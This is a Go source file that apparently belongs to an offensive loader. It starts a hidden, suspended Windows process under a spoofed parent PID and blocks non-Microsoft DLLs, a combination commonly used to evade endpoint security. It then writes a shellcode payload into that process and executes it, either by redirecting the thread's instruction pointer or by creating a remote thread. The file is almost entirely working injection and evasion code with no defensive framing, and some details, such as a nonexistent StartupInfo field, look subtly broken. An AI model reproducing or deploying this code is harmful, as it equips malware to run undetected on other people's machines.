// core/process_spoofing.go
// Contains functions for creating processes with spoofed parent and DLL mitigation
package core

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
	
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x10000000000000
)

// CreateProcessWithSpoofedParent creates a new process with a spoofed parent PID and DLL mitigation
func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID uint32, payload []byte) error {
	// First, try to get a handle to the spoofed parent process
	parentProcessHandle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		spoofedParentPID,
	)
	if err != nil {
		// If we can't access the parent, return an error
		return err
	}
	defer windows.CloseHandle(parentProcessHandle)

	// Initialize extended process and thread attributes
	var size uintptr
	// First call to get the required size
	success, err := initializeProcThreadAttributeList(nil, 2, 0, &size)
	if success || err != syscall.ERROR_INSUFFICIENT_BUFFER {
		// If we can't get the size, fall back to normal CreateProcess
		return createProcessSimple(targetProcessPath, payload)
	}

	// Allocate memory for the attribute list
	attributeList := make([]byte, size)
	attrList := (*ProcThreadAttributeList)(unsafe.Pointer(&attributeList[0]))

	// Initialize the attribute list
	success, err = initializeProcThreadAttributeList(attrList, 2, 0, &size)
	if !success {
		return err
	}
	defer deleteProcThreadAttributeList(attrList)

	// Add parent process attribute
	success, err = updateProcThreadAttribute(
		attrList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&parentProcessHandle)),
		unsafe.Sizeof(parentProcessHandle),
		nil,
		nil,
	)
	if !success {
		return err
	}

	// Add DLL mitigation policy
	policy := PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	success, err = updateProcThreadAttribute(
		attrList,
		0,
		PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
		uintptr(unsafe.Pointer(&policy)),
		unsafe.Sizeof(policy),
		nil,
		nil,
	)
	if !success {
		// Policy not supported on this version of Windows, continue without it
	}

	// Create the target process in suspended state with extended attributes
	var (
		si windows.StartupInfo
		pi windows.ProcessInformation
	)

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0
	si.ExStyle = windows.STARTF_USESTDHANDLES
	si.AttributeList = attrList

	// Create the target process in suspended state
	err = windows.CreateProcess(
		nil, // ApplicationName
		windows.StringToUTF16Ptr(targetProcessPath),
		nil, // ProcessAttributes
		nil, // ThreadAttributes
		false, // InheritHandles
		windows.CREATE_SUSPENDED|windows.EXTENDED_STARTUPINFO_PRESENT, // CreationFlags
		nil, // Environment
		nil, // CurrentDirectory
		&si, // StartupInfo
		&pi, // ProcessInformation
	)

	if err != nil {
		return err
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// If payload is provided, inject it into the process
	if payload != nil && len(payload) > 0 {
		// Allocate memory in the target process for the payload
		shellcodeAddr, err := AllocateRXMemory(pi.Process, payload)
		if err != nil {
			return err
		}

		// Get the thread context to modify the instruction pointer
		var ctx windows.Context
		ctx.Flags = windows.CONTEXT_CONTROL

		// Get the current thread context
		err = windows.GetThreadContext(pi.Thread, &ctx)
		if err != nil {
			// If GetThreadContext fails, fall back to creating a new thread in the process
			var threadHandle windows.Handle
			err = NtCreateThreadEx(
				&threadHandle,
				0x1FFFFF, // THREAD_ALL_ACCESS
				0,        // ObjectAttributes
				pi.Process,
				shellcodeAddr, // Start routine
				0,             // Parameter
				0,             // CreateSuspended (0 = start immediately)
				0,             // ZeroBits
				0,             // StackSize
				0,             // MaxStackSize
				0,             // AttributeList
			)
			if err != nil {
				return err
			}
			windows.CloseHandle(threadHandle)
			return nil
		}

		// Modify the instruction pointer to our payload
		ctx.Rip = shellcodeAddr

		// Set the modified context
		err = windows.SetThreadContext(pi.Thread, &ctx)
		if err != nil {
			return err
		}

		// Resume the thread to execute our payload
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	} else {
		// If no payload, just resume the original process
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	}

	return nil
}

// ProcThreadAttributeList structure for process creation
type ProcThreadAttributeList struct {
	dwFlags  uint32
	Size     uint64
	Count    uint64
	Reserved uint64
	Unknown  *uintptr
}

// System calls for extended process creation
var (
	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
)

func initializeProcThreadAttributeList(list *ProcThreadAttributeList, count uint32, flags uint32, size *uintptr) (bool, error) {
	ret, _, err := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(list)),
		uintptr(count),
		uintptr(flags),
		uintptr(unsafe.Pointer(size)),
	)
	return ret != 0, err
}

func updateProcThreadAttribute(
	list *ProcThreadAttributeList,
	flags uint32,
	attribute uintptr,
	data uintptr,
	size uintptr,
	returnSize *uintptr,
	previousSize *uintptr,
) (bool, error) {
	ret, _, err := procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(list)),
		uintptr(flags),
		attribute,
		data,
		size,
		uintptr(unsafe.Pointer(returnSize)),
		uintptr(unsafe.Pointer(previousSize)),
	)
	return ret != 0, err
}

func deleteProcThreadAttributeList(list *ProcThreadAttributeList) {
	procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(list)))
}

// createProcessSimple creates a process without PPID spoofing (fallback)
func createProcessSimple(targetProcessPath string, payload []byte) error {
	var (
		si windows.StartupInfo
		pi windows.ProcessInformation
	)

	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0

	// Create the target process in suspended state
	err := windows.CreateProcess(
		nil, // ApplicationName
		windows.StringToUTF16Ptr(targetProcessPath),
		nil, // ProcessAttributes
		nil, // ThreadAttributes
		false, // InheritHandles
		windows.CREATE_SUSPENDED, // CreationFlags
		nil, // Environment
		nil, // CurrentDirectory
		&si, // StartupInfo
		&pi, // ProcessInformation
	)

	if err != nil {
		return err
	}

	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// If payload is provided, inject it into the process
	if payload != nil && len(payload) > 0 {
		// Allocate memory in the target process for the payload
		shellcodeAddr, err := AllocateRXMemory(pi.Process, payload)
		if err != nil {
			return err
		}

		// Simple implementation: Create a new thread to execute the payload
		var threadHandle windows.Handle
		err = NtCreateThreadEx(
			&threadHandle,
			0x1FFFFF, // THREAD_ALL_ACCESS
			0,        // ObjectAttributes
			pi.Process,
			shellcodeAddr, // Start routine
			0,             // Parameter
			0,             // CreateSuspended (0 = start immediately)
			0,             // ZeroBits
			0,             // StackSize
			0,             // MaxStackSize
			0,             // AttributeList
		)
		if err != nil {
			return err
		}
		windows.CloseHandle(threadHandle)
	} else {
		// If no payload, just resume the original process
		_, err = windows.ResumeThread(pi.Thread)
		if err != nil {
			return err
		}
	}

	return nil
}